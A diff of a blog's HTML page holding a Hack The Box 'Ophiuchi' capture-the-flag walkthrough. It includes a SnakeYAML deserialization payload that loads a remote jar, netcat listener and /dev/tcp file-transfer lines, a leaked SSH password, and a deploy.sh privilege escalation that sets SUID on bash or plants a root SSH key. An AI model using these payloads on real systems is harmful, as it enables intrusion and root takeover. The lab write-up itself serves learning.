@@ -34,12 +34,12 @@
   <link rel="stylesheet" href="/css/main.min.css">
 
 
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Ophiuchi HTB Writeup"/>
-<meta name="twitter:description" content="1. Enumeration:  Nmap: To scan for open ports and services running $ nmap -sC -sV -oA 10.10.10.227   We only got two open ports: ssh on (port 22), apache server on (port 8080)
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Ophiuchi HTB Writeup"/>
+<meta name="twitter:description" content="1. Enumeration: Nmap: To scan for open ports and services running $ nmap -sC -sV -oA 10.10.10.227 We only got two open ports: ssh on (port 22), apache server on (port 8080)
 2. Web enumeration: let&rsquo;s discover what&rsquo;s running over there..
 and the source code (press ctrl&#43;u) so we got a Yaml parser and nothing interesting in the source code ..
-also try any yaml code u get this page as a response: About yaml &amp; parser thing:   YAML is a human-readable data-serialization language."/>
+also try any yaml code u get this page as a response: About yaml &amp; parser thing: YAML is a human-readable data-serialization language."/>
+<meta name="twitter:site" content="@Wh1r1w1nd"/>
 
   <script type="application/ld+json">
 {
@@ -238,18 +238,18 @@ To scan for open ports and services running</li>
 <ul>
 <li>put this payload in the Yaml parser:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!!javax.script.ScriptEngineManager <span style="color:#f92672">[</span>
-  !!java.net.URLClassLoader <span style="color:#f92672">[[</span>
-    !!java.net.URL <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;http://10.10.17.34/yaml-payload.jar&#34;</span><span style="color:#f92672">]</span>
-  <span style="color:#f92672">]]</span>
-<span style="color:#f92672">]</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/12.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!!javax.script.ScriptEngineManager <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>  !!java.net.URLClassLoader <span style="color:#f92672">[[</span>
+</span></span><span style="display:flex;"><span>    !!java.net.URL <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;http://10.10.17.34/yaml-payload.jar&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/12.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
 <li>open python server in the folder where your (rev.sh and yaml-payload.jar) files are &amp;&amp; open your netcat listener first before proceeding:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 -m http.server <span style="color:#ae81ff">80</span>
-nc -lvnp port
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/13.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>nc -lvnp port
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/13.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/14.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>And here we got a connection as &ldquo;tomcat&rdquo; after parsing with our payload ..</p>
 <ul>
@@ -281,11 +281,11 @@ nc -lvnp port
 <hr>
 <h3 id="4-privilege-escalation">4. Privilege Escalation:</h3>
 <p>let&rsquo;s ssh connect for better interactive shell:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh admin@10.10.10.227
-&gt; password: whythereisalimit
-$ locate python
-$ /usr/bin/python3.8 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span> 
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh admin@10.10.10.227
+</span></span><span style="display:flex;"><span>&gt; password: whythereisalimit
+</span></span><span style="display:flex;"><span>$ locate python
+</span></span><span style="display:flex;"><span>$ /usr/bin/python3.8 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span> 
+</span></span></code></pre></div><ul>
 <li>let&rsquo;s list the permitted commands for current user: <code>sudo -l</code> &raquo; worked without password
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/20.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
 </ul>
@@ -315,7 +315,7 @@ $ /usr/bin/python3.8 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&
 </li>
 </ul>
 <p>Transfer the main.wasm to your own machine and upload it to this site:</p>
-<pre><code>$ nc -l -p 1234 &gt; main.wasm  on the sender side
+<pre tabindex="0"><code>$ nc -l -p 1234 &gt; main.wasm  on the sender side
 $ nc -w 3 10.10.17.34 1234 &lt; main.wasm    on the reciever side
 OR 
 $ cat file &gt; /dev/tcp/ip/port
@@ -327,16 +327,16 @@ $ nc -lvnp port &gt; file
 <p>the 0 to be changed to 1:
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/29.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>Code after edit:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">(module
-  (type $t0 (func (result i32)))
-  (func $info (export &#34;info&#34;) (type $t0) (result i32)
-    (i32.const 1))
-  (table $T0 1 1 funcref)
-  (memory $memory (export &#34;memory&#34;) 16)
-  (global $g0 (mut i32) (i32.const 1048576))
-  (global $__data_end (export &#34;__data_end&#34;) i32 (i32.const 1048576))
-  (global $__heap_base (export &#34;__heap_base&#34;) i32 (i32.const 1048576)))
-</code></pre></div><p>Now download the file as test.wasm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>(module
+</span></span><span style="display:flex;"><span>  (type $t0 (func (result i32)))
+</span></span><span style="display:flex;"><span>  (func $info (export &#34;info&#34;) (type $t0) (result i32)
+</span></span><span style="display:flex;"><span>    (i32.const 1))
+</span></span><span style="display:flex;"><span>  (table $T0 1 1 funcref)
+</span></span><span style="display:flex;"><span>  (memory $memory (export &#34;memory&#34;) 16)
+</span></span><span style="display:flex;"><span>  (global $g0 (mut i32) (i32.const 1048576))
+</span></span><span style="display:flex;"><span>  (global $__data_end (export &#34;__data_end&#34;) i32 (i32.const 1048576))
+</span></span><span style="display:flex;"><span>  (global $__heap_base (export &#34;__heap_base&#34;) i32 (i32.const 1048576)))
+</span></span></code></pre></div><p>Now download the file as test.wasm:</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/30.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <h3 id="final-steps">Final steps:</h3>
 <ul>
@@ -344,13 +344,13 @@ $ nc -lvnp port &gt; file
 <li>will make a deploy.sh with our own payload</li>
 <li>run and getting root .. make these stuff in a writable directory /tmp</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; cd /tmp
-&gt; echo <span style="color:#e6db74">&#34;chmod +s /bin/bash&#34;</span> &gt; deploy.sh   sets the SUID on /bin/bash
-&gt; wget http://10.10.14.5/test.wasm -o main.wasm
-&gt; chmod <span style="color:#ae81ff">777</span> *  to change permissions <span style="color:#66d9ef">for</span> all inside dir
-&gt; sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
-&gt; /bin/bash -p
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/31.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; cd /tmp
+</span></span><span style="display:flex;"><span>&gt; echo <span style="color:#e6db74">&#34;chmod +s /bin/bash&#34;</span> &gt; deploy.sh   sets the SUID on /bin/bash
+</span></span><span style="display:flex;"><span>&gt; wget http://10.10.14.5/test.wasm -o main.wasm
+</span></span><span style="display:flex;"><span>&gt; chmod <span style="color:#ae81ff">777</span> *  to change permissions <span style="color:#66d9ef">for</span> all inside dir
+</span></span><span style="display:flex;"><span>&gt; sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
+</span></span><span style="display:flex;"><span>&gt; /bin/bash -p
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/31.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/32.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>test.wasm wasn&rsquo;t renamed as main.wasm
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/33.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
@@ -359,7 +359,7 @@ $ nc -lvnp port &gt; file
 <hr>
 <p>Another way:</p>
 <p>we also can use our ssh keys</p>
-<pre><code>echo 'echo &quot;PUB key&quot; &gt; /root/.ssh/authorized_keys' &gt;&gt; deploy.sh
+<pre tabindex="0"><code>echo &#39;echo &#34;PUB key&#34; &gt; /root/.ssh/authorized_keys&#39; &gt;&gt; deploy.sh
  &gt; wget http://10.10.14.5/test.wasm -o main.wasm
  &gt; sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
 </code></pre><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ophiuchi/35.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
@@ -504,7 +504,7 @@ $ nc -lvnp port &gt; file
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2020 - 2021</span>
+        <span itemprop="copyrightYear">2020 - 2024</span>
         
          
             <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
